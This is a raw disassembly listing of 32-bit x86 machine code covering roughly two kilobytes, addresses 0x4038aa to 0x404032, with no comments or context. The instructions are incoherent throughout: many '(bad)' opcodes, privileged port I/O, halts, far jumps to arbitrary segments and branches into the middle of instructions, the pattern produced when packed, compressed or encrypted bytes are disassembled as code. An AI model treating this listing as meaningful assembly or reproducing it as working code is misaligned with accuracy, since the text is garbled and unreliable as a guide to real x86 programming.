  4038aa:	xchg   ah,bh
  4038ac:	aad    0x0
  4038ae:	xchg   ebx,eax
  4038af:	outs   dx,DWORD PTR ds:[esi]
  4038b0:	and    eax,0x5d3c90b5
  4038b5:	repz bound eax,QWORD PTR [edx-0x14]
  4038b9:	scas   al,BYTE PTR es:[edi]
  4038ba:	mov    ebp,0x48002d6c
  4038bf:	jbe    0x40388f
  4038c1:	sbb    cl,bl
  4038c3:	test   eax,ebp
  4038c5:	xlat   BYTE PTR ds:[ebx]
  4038c6:	push   0x4d66bf04
  4038cb:	jo     0x4038d8
  4038cd:	inc    edx
  4038ce:	inc    edi
  4038cf:	repz mov esi,0xf0bf5a96
  4038d5:	fild   QWORD PTR [eax+0x77dff9fc]
  4038db:	test   al,0xff
  4038dd:	and    bl,dh
  4038df:	sbb    DWORD PTR [edi-0x14],edx
  4038e2:	arpl   WORD PTR [edi],ax
  4038e4:	xchg   ecx,eax
  4038e5:	ja     0x403927
  4038e7:	lahf   
  4038e8:	mov    ds:0xef2f5583,al
  4038ed:	mov    ah,0x86
  4038ef:	mov    ch,0xfb
  4038f1:	lds    ecx,FWORD PTR [esp+ecx*4-0xa]
  4038f5:	mov    al,ds:0xfec16050
  4038fa:	lods   eax,DWORD PTR ds:[esi]
  4038fb:	adc    al,0xe8
  4038fd:	xchg   edx,eax
  4038fe:	sub    ebp,ebp
  403900:	pop    es
  403901:	inc    edx
  403902:	jnp    0x40395f
  403904:	sahf   
  403905:	lock and DWORD PTR [edx],esi
  403908:	ins    DWORD PTR es:[edi],dx
  403909:	mov    al,ds:0x68a7e94
  40390e:	pop    ss
  40390f:	push   eax
  403910:	fadd   DWORD PTR [edi+0x45]
  403913:	dec    esp
  403914:	(bad)  
  403915:	fcom   QWORD PTR [eax-0x40a62a6c]
  40391b:	inc    edi
  40391c:	sbb    BYTE PTR [ecx+0x1cd91ff5],cl
  403922:	push   edi
  403923:	gs ja  0x403991
  403926:	mov    al,ds:0xf677ba54
  40392b:	cwde   
  40392c:	pop    edx
  40392d:	in     eax,dx
  40392e:	jp     0x4038db
  403930:	cmc    
  403931:	pop    ebx
  403932:	add    ch,al
  403934:	push   ss
  403935:	xlat   BYTE PTR ds:[ebx]
  403936:	sbb    DWORD PTR ds:0xc88ce15f,ebx
  40393c:	or     eax,0x8ba681c1
  403941:	or     eax,DWORD PTR [edx-0x14a3ef1]
  403947:	mov    al,ds:0xe85c2a0c
  40394c:	mov    ebx,0xd8df290a
  403951:	lods   al,BYTE PTR ds:[esi]
  403952:	out    0x46,al
  403954:	pop    ds
  403955:	in     al,dx
  403956:	out    0xdb,al
  403958:	adc    DWORD PTR [ecx-0x26],eax
  40395b:	popf   
  40395c:	and    BYTE PTR [eax+0x20e767c4],cl
  403962:	xor    BYTE PTR [ecx+eax*2-0x55],dh
  403966:	repz out 0xf,eax
  403969:	(bad)  [ebp+0x55]
  40396c:	out    0x16,eax
  40396e:	jmp    0xc89c:0x4cc74da6
  403975:	adc    eax,0xcfd69d23
  40397a:	lock or DWORD PTR [eax],esi
  40397d:	dec    esi
  40397e:	icebp  
  40397f:	push   edx
  403980:	dec    edx
  403981:	fld1   
  403983:	cdq    
  403984:	mov    al,0x5d
  403986:	mov    cl,0xde
  403988:	das    
  403989:	loopne 0x403a02
  40398b:	lock pop eax
  40398d:	ficom  WORD PTR [ebx+ecx*1]
  403990:	push   esp
  403991:	add    eax,DWORD PTR [ecx]
  403993:	mov    eax,esp
  403995:	and    al,0xa1
  403997:	lgs    ebx,FWORD PTR [edi-0x1b]
  40399b:	cmp    edi,DWORD PTR [ecx]
  40399d:	sub    eax,0x63960e7
  4039a2:	sbb    ebp,DWORD PTR [ebx+0x57]
  4039a5:	mov    ebx,0xad1cd8f2
  4039aa:	retw   0x89b
  4039ae:	adc    WORD PTR [ebx-0x7d7247e6],dx
  4039b5:	cmp    eax,0x2b84b9c5
  4039ba:	fwait
  4039bb:	pop    edx
  4039bc:	push   ebx
  4039bd:	lahf   
  4039be:	dec    eax
  4039bf:	pop    eax
  4039c0:	mov    eax,0xba7f895e
  4039c5:	push   esp
  4039c6:	pop    ds
  4039c7:	push   0x85fc9fe0
  4039cc:	ds xchg esp,eax
  4039ce:	pop    esp
  4039cf:	ret    0xb3fc
  4039d2:	mov    dl,0xb5
  4039d4:	shl    DWORD PTR [esi+0x33a8d7fa],0x4f
  4039db:	imul   esp,DWORD PTR [si-0x1029],0xf63f7838
  4039e4:	xchg   esp,eax
  4039e5:	mov    edi,0x6ea76e9a
  4039ea:	jmp    0x4039f1
  4039ec:	jge    0x40397e
  4039ee:	cwd    
  4039f0:	push   esp
  4039f1:	sub    ecx,ecx
  4039f3:	hlt    
  4039f4:	scas   al,BYTE PTR es:[edi]
  4039f5:	cmp    al,0xec
  4039f7:	(bad)  [ecx+0x1b]
  4039fa:	jae    0x4039df
  4039fc:	sub    ch,BYTE PTR [eax]
  4039fe:	(bad)  
  4039ff:	or     al,0x37
  403a01:	fistp  WORD PTR [ebp+0x4bdb83ff]
  403a07:	push   ecx
  403a08:	loopne 0x4039e7
  403a0a:	(bad)  
  403a0b:	jp     0x4039a1
  403a0d:	mov    ecx,DWORD PTR [ecx]
  403a0f:	out    0x72,al
  403a11:	jno    0x40399e
  403a13:	push   edx
  403a14:	stos   DWORD PTR es:[edi],eax
  403a15:	lock push esi
  403a17:	mov    es,ebx
  403a19:	outs   dx,BYTE PTR ds:[esi]
  403a1a:	ins    DWORD PTR es:[edi],dx
  403a1b:	mov    bh,0x61
  403a1d:	jo     0x403a86
  403a1f:	rol    bh,0xbf
  403a22:	push   esi
  403a23:	cmp    esp,DWORD PTR [ebx]
  403a25:	popf   
  403a26:	mov    edx,0x1e3bcd38
  403a2b:	sar    DWORD PTR [edi],cl
  403a2d:	in     al,0xfe
  403a2f:	push   eax
  403a30:	mov    ebp,0xc65de2f7
  403a35:	fs xchg esp,eax
  403a37:	addr16 fdivr st,st(0)
  403a3a:	mov    fs,eax
  403a3c:	sub    cl,cl
  403a3e:	imul   edx,DWORD PTR [esi-0x233c5e8],0x45
  403a45:	inc    edi
  403a46:	pop    eax
  403a47:	iret   
  403a48:	out    dx,eax
  403a49:	nop
  403a4a:	push   es
  403a4b:	or     al,ah
  403a4d:	popa   
  403a4e:	mov    ah,0x98
  403a50:	push   ebx
  403a51:	jmp    0x403a25
  403a53:	(bad)  
  403a54:	jno    0x403abd
  403a56:	lock mov dl,0xe9
  403a59:	jp     0x403a69
  403a5b:	stos   BYTE PTR es:[edi],al
  403a5c:	pusha  
  403a5d:	test   ah,al
  403a5f:	fimul  WORD PTR [eax]
  403a61:	pop    edx
  403a62:	test   al,0x2a
  403a64:	mov    bh,0xad
  403a66:	pop    ss
  403a67:	repnz mov WORD PTR [ecx+0x2d00f323],gs
  403a6e:	shl    BYTE PTR [ecx+0x7ce9c605],1
  403a74:	scas   eax,DWORD PTR es:[edi]
  403a75:	jae    0x403ab8
  403a77:	imul   DWORD PTR [esi+0x7e]
  403a7a:	cli    
  403a7b:	push   cs
  403a7c:	(bad)  
  403a7d:	aad    0xc4
  403a7f:	leave  
  403a80:	es push ebp
  403a82:	mov    dl,BYTE PTR [eax]
  403a84:	jb     0x403aef
  403a86:	adc    al,0x6f
  403a88:	jge    0x403aae
  403a8a:	cmp    esp,esi
  403a8c:	mov    dh,0xa7
  403a8e:	pop    edi
  403a8f:	dec    esi
  403a90:	mov    eax,ds:0x52a49bb9
  403a95:	xchg   esi,eax
  403a96:	rcr    DWORD PTR es:[ecx],1
  403a99:	out    dx,eax
  403a9a:	push   cs
  403a9b:	pop    ebx
  403a9c:	dec    esp
  403a9d:	sub    edx,ebx
  403a9f:	cmp    DWORD PTR [ebx-0x40f7da79],eax
  403aa5:	mov    eax,0x548294cb
  403aaa:	add    DWORD PTR ds:0xdbcb5562,edx
  403ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ab1:	add    al,0x5b
  403ab3:	sub    esp,DWORD PTR ds:0x7b2bc83f
  403ab9:	mov    al,0xc8
  403abb:	ins    BYTE PTR es:[edi],dx
  403abc:	cwde   
  403abd:	(bad)  
  403abe:	xor    al,0xa7
  403ac0:	xor    DWORD PTR [edi],0xffffffc5
  403ac3:	test   DWORD PTR [edx-0x3],0xc4e6ac9e
  403aca:	mov    cl,0x5c
  403acc:	sahf   
  403acd:	loop   0x403a7f
  403acf:	pop    ecx
  403ad0:	push   ebx
  403ad1:	push   0xf7cf4d7e
  403ad6:	cmp    bh,BYTE PTR ds:0x88d4a3d6
  403adc:	mov    BYTE PTR [eax-0x1cf21256],dh
  403ae2:	fdivr  DWORD PTR [eax-0x601050e6]
  403ae8:	js     0x403ac4
  403aea:	into   
  403aeb:	push   ecx
  403aec:	mov    esi,0x4a20e12c
  403af1:	sub    al,0xe8
  403af3:	adc    BYTE PTR [esi-0x7553993e],cl
  403af9:	sbb    eax,0x606dec79
  403afe:	loopne 0x403b0e
  403b00:	scas   al,BYTE PTR es:[edi]
  403b01:	jecxz  0x403aa8
  403b03:	nop
  403b04:	xor    edx,edi
  403b06:	dec    edx
  403b07:	add    BYTE PTR [ecx-0x2e],0xeb
  403b0b:	popf   
  403b0c:	adc    eax,esi
  403b0e:	pop    ebp
  403b0f:	adc    ebx,DWORD PTR [eax+0xd]
  403b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b13:	test   al,0x8e
  403b15:	loopne 0x403b64
  403b17:	(bad)  
  403b19:	fcmovbe st,st(2)
  403b1b:	xchg   ebp,eax
  403b1c:	pop    esp
  403b1d:	mov    bl,BYTE PTR [ecx-0x3c4dc7e7]
  403b23:	inc    ebp
  403b24:	out    dx,al
  403b25:	push   ss
  403b26:	push   esi
  403b27:	mov    eax,ds:0x96d6937f
  403b2c:	mov    cl,0x2b
  403b2e:	(bad)  
  403b30:	or     DWORD PTR [ecx],esp
  403b32:	dec    esi
  403b33:	inc    ebx
  403b34:	xchg   esi,eax
  403b35:	cs jo  0x403b9c
  403b38:	ror    ebx,1
  403b3a:	mov    ch,0xcf
  403b3c:	fdivr  QWORD PTR [edx]
  403b3e:	add    al,0x41
  403b40:	pop    es
  403b41:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403b43:	mov    esi,DWORD PTR [esi-0x335baf30]
  403b49:	sub    DWORD PTR [edi+0x24],edi
  403b4c:	pop    ebp
  403b4d:	sbb    dh,BYTE PTR ds:0x17b5e4d2
  403b53:	dec    ebp
  403b54:	(bad)  
  403b56:	mov    ebx,DWORD PTR [ebp-0x7f]
  403b59:	sahf   
  403b5a:	hlt    
  403b5b:	inc    esi
  403b5c:	(bad)  
  403b5d:	cmp    eax,DWORD PTR [esi]
  403b5f:	push   ss
  403b60:	ret    
  403b61:	sbb    ecx,DWORD PTR [edi+0x70]
  403b64:	retf   0x5f44
  403b67:	inc    ecx
  403b68:	shl    BYTE PTR [esi-0x29],cl
  403b6b:	xor    BYTE PTR [edi],dl
  403b6d:	inc    DWORD PTR [ebp+0x429215d8]
  403b73:	outs   dx,DWORD PTR ds:[esi]
  403b74:	inc    edx
  403b75:	dec    esp
  403b76:	add    eax,edi
  403b78:	adc    ecx,DWORD PTR [edx]
  403b7a:	push   esp
  403b7b:	mov    ah,dl
  403b7d:	and    ch,BYTE PTR [edi+ebx*8]
  403b80:	add    BYTE PTR [ebp+0x7cdb9562],dh
  403b86:	fistp  WORD PTR [ecx+ebx*8]
  403b89:	jno    0x403b31
  403b8b:	xor    DWORD PTR [esi+ebp*4],edi
  403b8e:	rol    BYTE PTR [edi],1
  403b90:	dec    esp
  403b91:	outs   dx,BYTE PTR ds:[esi]
  403b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b93:	fistp  WORD PTR [edx]
  403b95:	scas   al,BYTE PTR es:[edi]
  403b96:	mov    cl,0x40
  403b98:	mov    al,0x62
  403b9a:	xor    eax,0xcc577eca
  403b9f:	test   BYTE PTR [ebp-0x6704b784],bh
  403ba5:	xchg   edx,eax
  403ba6:	sbb    BYTE PTR [esi+edi*4+0x2b],bh
  403baa:	stos   BYTE PTR es:[edi],al
  403bab:	fwait
  403bac:	push   ss
  403bad:	cmp    BYTE PTR [ebx-0x4f],dl
  403bb0:	add    edi,DWORD PTR [esi+0x3c]
  403bb3:	stc    
  403bb4:	jns    0x403bb3
  403bb6:	retf   0x16bf
  403bb9:	push   0x360fe0f3
  403bbe:	ret    0x8c79
  403bc1:	jne    0x403b54
  403bc3:	sti    
  403bc4:	sub    al,BYTE PTR [eax]
  403bc6:	add    al,0x84
  403bc8:	or     BYTE PTR [ebp-0x57],bh
  403bcb:	shl    BYTE PTR [eax-0x1a4488f4],cl
  403bd1:	xchg   ebp,eax
  403bd2:	aam    0x1e
  403bd4:	cmp    eax,ecx
  403bd6:	pop    ds
  403bd7:	xchg   edx,eax
  403bd8:	mov    BYTE PTR [esi],ch
  403bda:	or     bl,BYTE PTR [ebx+ebp*1-0x4]
  403bde:	and    esp,DWORD PTR [eax]
  403be0:	dec    esi
  403be1:	cvtps2pd xmm4,xmm2
  403be4:	pop    esp
  403be5:	pop    ebx
  403be6:	or     BYTE PTR [edx],bl
  403be8:	loop   0x403c1b
  403bea:	sub    al,0xa7
  403bec:	imul   ebx,edx,0x62
  403bef:	jge    0x403c34
  403bf1:	sub    DWORD PTR [ebx-0x2df945a4],esp
  403bf7:	fidiv  DWORD PTR [esi+0x304f6073]
  403bfd:	rcr    BYTE PTR [edi-0x36fe8108],cl
  403c03:	call   0x4d52:0x658a5df0
  403c0a:	cld    
  403c0b:	push   edi
  403c0c:	outs   dx,BYTE PTR ds:[esi]
  403c0d:	push   esi
  403c0e:	push   0xc34148a9
  403c13:	xchg   esi,eax
  403c14:	push   esi
  403c15:	or     esp,DWORD PTR [edi+0x17daefe6]
  403c1b:	sbb    bh,cl
  403c1d:	pop    ebx
  403c1e:	dec    ebx
  403c1f:	cmp    al,0x75
  403c21:	jmp    0xb9e6:0xb48c9a1
  403c28:	xchg   edi,eax
  403c29:	repz in al,0xa1
  403c2c:	aam    0xe2
  403c2e:	ds mov ah,0x42
  403c31:	sti    
  403c32:	leave  
  403c33:	imul   esi,edx,0x3f
  403c36:	inc    edx
  403c37:	clc    
  403c38:	dec    eax
  403c39:	in     eax,dx
  403c3a:	stos   DWORD PTR es:[edi],eax
  403c3b:	dec    esp
  403c3c:	jmp    0x403c6e
  403c3e:	int    0x3c
  403c40:	shl    al,0x87
  403c43:	jnp    0x403bf5
  403c45:	mov    dh,cl
  403c47:	mov    esp,0x52c4da4f
  403c4c:	sbb    BYTE PTR [edi],ah
  403c4e:	aad    0xe0
  403c50:	lods   al,BYTE PTR ds:[esi]
  403c51:	cmp    al,0xb0
  403c53:	mov    edx,0xd4b5a93d
  403c58:	sti    
  403c59:	(bad)  
  403c5a:	pop    ebx
  403c5b:	xor    al,0xc4
  403c5d:	les    esi,FWORD PTR [edi+0x58]
  403c60:	imul   esi,edx,0x6b
  403c63:	sub    ah,BYTE PTR [edi+0x541e749d]
  403c69:	lahf   
  403c6a:	inc    esi
  403c6b:	loope  0x403ca1
  403c6d:	push   ds
  403c6e:	xchg   ebx,eax
  403c6f:	stc    
  403c70:	test   BYTE PTR [eax],ah
  403c72:	or     eax,0xd7bd289c
  403c77:	shl    bh,cl
  403c79:	mov    dh,0x81
  403c7b:	es sbb al,0x59
  403c7e:	out    0xbb,eax
  403c80:	pop    es
  403c81:	loope  0x403c96
  403c83:	ret    0x4957
  403c86:	lea    ecx,ds:0x19adf88f
  403c8c:	jae    0x403c1d
  403c8e:	sahf   
  403c8f:	jno    0x403c34
  403c91:	popf   
  403c92:	aam    0x65
  403c94:	push   ds
  403c95:	or     BYTE PTR [ebp-0x1f3b9feb],dh
  403c9b:	pop    ebp
  403c9c:	dec    ebx
  403c9d:	mov    ds:0x64d40865,eax
  403ca2:	add    al,0xf4
  403ca4:	pop    esp
  403ca5:	jne    0x403c2b
  403ca7:	sbb    eax,0x30065697
  403cac:	loop   0x403cda
  403cae:	inc    edx
  403caf:	jae    0x403c5b
  403cb1:	inc    edx
  403cb2:	xor    edx,DWORD PTR [ecx+eax*4-0x21c6d65c]
  403cb9:	outs   dx,DWORD PTR ds:[esi]
  403cba:	fs sub eax,0xc7a97118
  403cc0:	adc    esi,eax
  403cc2:	mov    cl,al
  403cc4:	add    bh,BYTE PTR [ebx-0x2d]
  403cc7:	jae    0x403ca6
  403cc9:	ret    
  403cca:	adc    esp,ecx
  403ccc:	cdq    
  403ccd:	cwde   
  403cce:	fisttp DWORD PTR [ecx]
  403cd0:	outs   dx,DWORD PTR ds:[esi]
  403cd1:	ins    BYTE PTR es:[edi],dx
  403cd2:	lods   eax,DWORD PTR ds:[esi]
  403cd3:	scas   eax,DWORD PTR es:[edi]
  403cd4:	pop    ecx
  403cd5:	outs   dx,BYTE PTR ds:[esi]
  403cd6:	xor    al,0x88
  403cd8:	xchg   edx,eax
  403cd9:	fild   WORD PTR [edi-0x5f]
  403cdc:	hlt    
  403cdd:	inc    ebx
  403cde:	sahf   
  403cdf:	mov    BYTE PTR [edx*4+0x2b268854],ah
  403ce6:	out    0x19,eax
  403ce8:	push   0x67f0cd68
  403ced:	pop    es
  403cee:	scas   eax,DWORD PTR es:[edi]
  403cef:	inc    eax
  403cf0:	dec    esp
  403cf1:	xchg   ecx,eax
  403cf2:	stc    
  403cf3:	test   DWORD PTR [edi],eax
  403cf5:	icebp  
  403cf6:	shr    BYTE PTR [esi+eax*8+0x79f7169],1
  403cfd:	pop    ebx
  403cfe:	ret    0xcc12
  403d01:	pop    ecx
  403d02:	in     eax,dx
  403d03:	dec    eax
  403d04:	push   ds
  403d05:	into   
  403d06:	fwait
  403d07:	outs   dx,BYTE PTR ds:[esi]
  403d08:	test   BYTE PTR [ebp+eax*8-0x1c],bl
  403d0c:	inc    eax
  403d0d:	jo     0x403d5c
  403d0f:	push   edi
  403d10:	sbb    al,BYTE PTR [ebx-0x54d4f7f9]
  403d16:	call   0x312a2958
  403d1b:	sahf   
  403d1c:	(bad)  
  403d1d:	mov    ds:0xc8c1d9bb,eax
  403d22:	inc    ebx
  403d23:	inc    ebp
  403d24:	addr16 icebp 
  403d26:	jle    0x403cb8
  403d28:	je     0x403d7c
  403d2a:	push   esi
  403d2b:	push   0x6
  403d2d:	adc    bh,BYTE PTR [ebx-0x4ee45f92]
  403d33:	dec    ebx
  403d34:	sar    esi,0x99
  403d37:	js     0x403cc3
  403d39:	fidivr WORD PTR [ebp+0x47eddf3b]
  403d3f:	imul   BYTE PTR [eax+0x3f]
  403d42:	jecxz  0x403d15
  403d44:	dec    eax
  403d45:	xchg   edx,eax
  403d46:	xchg   ebp,eax
  403d47:	push   ebp
  403d48:	lods   eax,DWORD PTR ds:[esi]
  403d49:	cmp    BYTE PTR [ebx+ebp*4-0xc],dl
  403d4d:	fsub   DWORD PTR [esp+ebp*4]
  403d50:	sbb    BYTE PTR [esi+edx*2-0x59],ah
  403d54:	ficomp WORD PTR [ebp+0x10]
  403d57:	and    DWORD PTR [ecx-0x354d3266],ebx
  403d5d:	in     eax,dx
  403d5e:	in     al,0x6e
  403d60:	or     al,BYTE PTR [eax-0x1a]
  403d63:	push   eax
  403d64:	imul   ebx,esi,0x48
  403d67:	mov    ch,BYTE PTR [ecx-0x62cba18b]
  403d6d:	cmp    BYTE PTR [edx-0x953bdfe],ah
  403d73:	cmp    DWORD PTR [eax+eiz*8+0x234d4ca],ebx
  403d7a:	ror    edx,cl
  403d7c:	cs mov ebp,0x6732c4ce
  403d82:	dec    ebx
  403d83:	call   0x6543:0x695da620
  403d8a:	stos   BYTE PTR es:[edi],al
  403d8b:	mov    eax,ds:0x5abe2343
  403d90:	imul   edi,DWORD PTR [ecx+ecx*4],0x5
  403d94:	loop   0x403d86
  403d96:	fisttp WORD PTR ds:0xa8e552b5
  403d9c:	scas   al,BYTE PTR es:[edi]
  403d9d:	aam    0xec
  403d9f:	loopne 0x403d67
  403da1:	(bad)  
  403da4:	cmp    eax,0x3949809f
  403da9:	add    esi,DWORD PTR [ebx+0x66]
  403dac:	bound  edi,QWORD PTR [eax+0x40]
  403daf:	xchg   ebx,eax
  403db0:	adc    ah,BYTE PTR [edi-0x1f089b47]
  403db6:	xchg   DWORD PTR fs:0x34b3a523,esp
  403dbd:	add    ebx,edx
  403dbf:	test   dh,bl
  403dc1:	add    eax,0xa4ba347
  403dc6:	inc    ecx
  403dc7:	jbe    0x403e15
  403dc9:	cmp    BYTE PTR [ebp+0x753248f1],ch
  403dcf:	xchg   edx,eax
  403dd0:	pop    es
  403dd1:	mov    ebp,0xea879ea2
  403dd6:	xchg   esp,eax
  403dd7:	jns    0x403db6
  403dd9:	and    al,0xe
  403ddb:	test   al,0x1f
  403ddd:	mov    ecx,0xa3c42f9d
  403de2:	hlt    
  403de3:	pop    sp
  403de5:	out    0xc6,eax
  403de7:	fnstcw WORD PTR [ecx-0x4a8cf9ac]
  403ded:	mov    eax,ds:0xfcdb136d
  403df2:	daa    
  403df3:	xchg   ebx,eax
  403df4:	loope  0x403e6e
  403df6:	add    dl,BYTE PTR [eax+0x2d]
  403df9:	cs push ds
  403dfb:	adc    al,0xd2
  403dfd:	shr    DWORD PTR [eax],cl
  403dff:	adc    al,0xf3
  403e01:	sbb    edx,DWORD PTR [edx-0x16]
  403e04:	xchg   edi,eax
  403e05:	cld    
  403e06:	dec    ebp
  403e07:	ror    DWORD PTR [ecx+0x69ab7e62],0x5f
  403e0e:	lds    eax,FWORD PTR [edi-0x3eff1465]
  403e14:	loope  0x403da1
  403e16:	popa   
  403e17:	xchg   esi,eax
  403e18:	ins    DWORD PTR es:[edi],dx
  403e19:	sti    
  403e1a:	cmp    al,0xad
  403e1c:	pop    edx
  403e1d:	xor    al,bl
  403e1f:	fld    DWORD PTR [esi+ebx*4]
  403e22:	and    ebx,DWORD PTR [edx+0x76903e30]
  403e28:	jb     0x403e2b
  403e2a:	mov    DWORD PTR [edi-0x4d],ebp
  403e2d:	ss mov dl,0xa3
  403e30:	adc    BYTE PTR [esi],ch
  403e32:	in     al,0x86
  403e34:	add    ch,BYTE PTR [esi+0x2262901b]
  403e3a:	(bad)  
  403e3b:	loop   0x403dfd
  403e3d:	mov    eax,ds:0x52b139f8
  403e42:	xchg   ebx,eax
  403e43:	aas    
  403e44:	or     bh,BYTE PTR ds:0xa0b5b87e
  403e4a:	and    ebx,DWORD PTR [ebx+0x3599f233]
  403e50:	pop    es
  403e51:	adc    eax,0xd5ea4d27
  403e56:	xchg   edx,eax
  403e57:	jp     0x403e21
  403e59:	sub    bh,BYTE PTR [edx+ecx*1+0x63]
  403e5d:	and    eax,0x9b49b109
  403e62:	lods   al,BYTE PTR ds:[esi]
  403e63:	or     DWORD PTR [eax-0x20732070],eax
  403e69:	iret   
  403e6a:	aam    0x82
  403e6c:	adc    eax,0x39a845a5
  403e71:	xchg   ebx,eax
  403e72:	or     al,cl
  403e74:	xchg   ecx,eax
  403e75:	cmp    esp,ebx
  403e77:	jmp    0xb7a0b630
  403e7c:	fstp   DWORD PTR [ecx-0x67058437]
  403e82:	cmp    ebp,0xffffffd7
  403e85:	jnp    0x403ee7
  403e87:	pop    esp
  403e88:	cld    
  403e89:	or     eax,esp
  403e8b:	xor    esi,0x6a49d4fb
  403e91:	ins    DWORD PTR es:[edi],dx
  403e92:	push   edi
  403e93:	mov    cl,0x8d
  403e95:	data16 int3 
  403e97:	xor    dl,dl
  403e99:	sub    edx,esp
  403e9b:	jge    0x403eef
  403e9d:	stos   BYTE PTR es:[edi],al
  403e9e:	nop
  403e9f:	test   BYTE PTR [ecx],ch
  403ea1:	mov    al,ds:0xaa928607
  403ea6:	call   0x54b1:0xa2cfbc4b
  403ead:	(bad)  
  403eae:	in     eax,dx
  403eaf:	call   0xa137e319
  403eb4:	lock pop esp
  403eb6:	enter  0x5980,0xcf
  403eba:	rol    DWORD PTR [ecx],cl
  403ebc:	xchg   esi,eax
  403ebd:	mov    bl,0xcf
  403ebf:	div    DWORD PTR [ecx+edi*8-0x4cf717f4]
  403ec6:	push   0xffffff9c
  403ec8:	ins    DWORD PTR es:[edi],dx
  403ec9:	xchg   esi,eax
  403eca:	ss xchg edi,eax
  403ecc:	dec    esp
  403ecd:	popf   
  403ece:	std    
  403ecf:	imul   edx,DWORD PTR [ecx-0x72],0x4c898c1b
  403ed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed7:	fwait
  403ed8:	and    al,0xba
  403eda:	lods   eax,DWORD PTR ds:[esi]
  403edb:	call   0x8deccc12
  403ee0:	int3   
  403ee1:	and    BYTE PTR [ebx+0x49e3ea1e],ch
  403ee7:	or     dl,BYTE PTR [edx-0x10]
  403eea:	pop    ebx
  403eeb:	pop    ebx
  403eec:	add    BYTE PTR [ebx+ebx*2-0x3b],0x40
  403ef1:	fsubrp st(6),st
  403ef3:	inc    edx
  403ef4:	ss mov esp,0x8469a47e
  403efa:	sub    ecx,DWORD PTR [esi+0x63]
  403efd:	lock scas eax,DWORD PTR es:[edi]
  403eff:	mov    edi,0xc99129ff
  403f04:	mov    cl,0x8d
  403f06:	aad    0xea
  403f08:	loop   0x403f6b
  403f0a:	(bad)  
  403f0b:	jmp    DWORD PTR [edx-0x17]
  403f0e:	sbb    al,0xfd
  403f10:	nop
  403f11:	mov    BYTE PTR [edi-0x22432cca],0x6d
  403f18:	fild   DWORD PTR [esp+edi*4]
  403f1b:	and    BYTE PTR [esi-0x77],dl
  403f1e:	(bad)  
  403f1f:	loopne 0x403f1b
  403f21:	lock mov BYTE PTR [eax-0x73feaed2],0x47
  403f29:	lods   al,BYTE PTR ds:[esi]
  403f2a:	inc    ebp
  403f2b:	test   ch,bl
  403f2d:	je     0x403eee
  403f2f:	sub    BYTE PTR [edi+0x2b79c719],dh
  403f35:	aaa    
  403f36:	hlt    
  403f37:	nop
  403f38:	enter  0x2b6,0x82
  403f3c:	(bad)  
  403f3d:	cmc    
  403f3e:	jne    0x403f01
  403f40:	and    al,0x65
  403f42:	ss jae 0x403f46
  403f45:	aas    
  403f46:	and    DWORD PTR [esi-0x510c9922],edi
  403f4c:	sub    al,0x57
  403f4e:	and    DWORD PTR [ecx+0x33c02b58],ebx
  403f54:	pusha  
  403f55:	jno    0x403f27
  403f57:	neg    BYTE PTR [ecx+0x7f840743]
  403f5d:	jp     0x403ee7
  403f5f:	xchg   edx,eax
  403f60:	in     eax,0x22
  403f62:	repz mov edx,0x51a0fcc6
  403f68:	pop    edi
  403f69:	fs jns 0x403f7c
  403f6c:	inc    eax
  403f6d:	clc    
  403f6e:	mov    edx,0x6f58f857
  403f73:	ret    0x2c9a
  403f76:	pop    ss
  403f77:	dec    ecx
  403f78:	loopne 0x403f85
  403f7a:	and    BYTE PTR ds:0xdebfddc3,0xd1
  403f81:	ret    
  403f82:	fbstp  TBYTE PTR [edi-0x76]
  403f85:	jmp    0x88eb:0x9d638eb8
  403f8c:	cld    
  403f8d:	push   edx
  403f8e:	xor    BYTE PTR [ecx-0x4f8741da],ah
  403f94:	gs lock jp 0x403f3e
  403f98:	or     al,0x53
  403f9a:	xchg   esi,eax
  403f9b:	fdivr  QWORD PTR [eax+0x2e]
  403f9e:	jns    0x403f29
  403fa0:	leave  
  403fa1:	ins    BYTE PTR es:[edi],dx
  403fa2:	push   cs
  403fa3:	cwde   
  403fa4:	fsubr  st(0),st
  403fa6:	mov    bl,dl
  403fa8:	aad    0xc4
  403faa:	cmp    al,0xac
  403fac:	sbb    DWORD PTR [ecx],0xffffffd9
  403faf:	test   BYTE PTR [edi],ah
  403fb1:	scas   al,BYTE PTR es:[edi]
  403fb2:	lds    esp,FWORD PTR [ebx-0x8eb4fad]
  403fb8:	xor    BYTE PTR [esi+0x4d32e7c9],bl
  403fbe:	fimul  DWORD PTR [eax+0x1148e3e0]
  403fc4:	lods   al,BYTE PTR ds:[esi]
  403fc5:	iret   
  403fc6:	push   eax
  403fc7:	sbb    eax,0x7f318856
  403fcc:	iret   
  403fcd:	sub    BYTE PTR [ecx-0x5b],dh
  403fd0:	inc    esi
  403fd1:	cld    
  403fd2:	cdq    
  403fd3:	add    dl,BYTE PTR [edx+0x41]
  403fd6:	inc    edx
  403fd8:	sub    DWORD PTR [esi+0x4f1ce7c1],ebp
  403fde:	cmp    al,0x26
  403fe0:	daa    
  403fe1:	cmp    DWORD PTR [esi+0x47],ebp
  403fe4:	and    eax,0x64efe84f
  403fe9:	hlt    
  403fea:	xchg   ebx,eax
  403feb:	cli    
  403fec:	dec    edx
  403fed:	adc    bh,bh
  403fef:	es stos DWORD PTR es:[edi],eax
  403ff1:	push   ss
  403ff2:	ret    0x531a
  403ff5:	jmp    0x403f96
  403ff7:	in     eax,dx
  403ff8:	sbb    DWORD PTR ds:0xf1d08db3,ebp
  403ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fff:	sbb    bh,BYTE PTR [eax-0x42]
  404002:	pop    edx
  404003:	inc    ecx
  404004:	jmp    0x6e660543
  404009:	nop
  40400a:	sub    eax,0x3034234e
  40400f:	in     al,0x83
  404011:	int3   
  404012:	fld    DWORD PTR [edi+esi*8+0x71a8da0e]
  404019:	stos   BYTE PTR es:[edi],al
  40401a:	sub    eax,0x31d2acba
  40401f:	leave  
  404020:	aam    0x64
  404022:	lods   al,BYTE PTR ds:[esi]
  404023:	cdq    
  404024:	arpl   di,dx
  404026:	adc    bh,BYTE PTR [eax+ecx*4-0x4a]
  40402a:	shl    DWORD PTR [ecx+0x2f],1
  40402d:	out    dx,al
  40402e:	pop    ebp
  40402f:	and    bh,bl
  404031:	into   
  404032:	mov    ah,0x4e
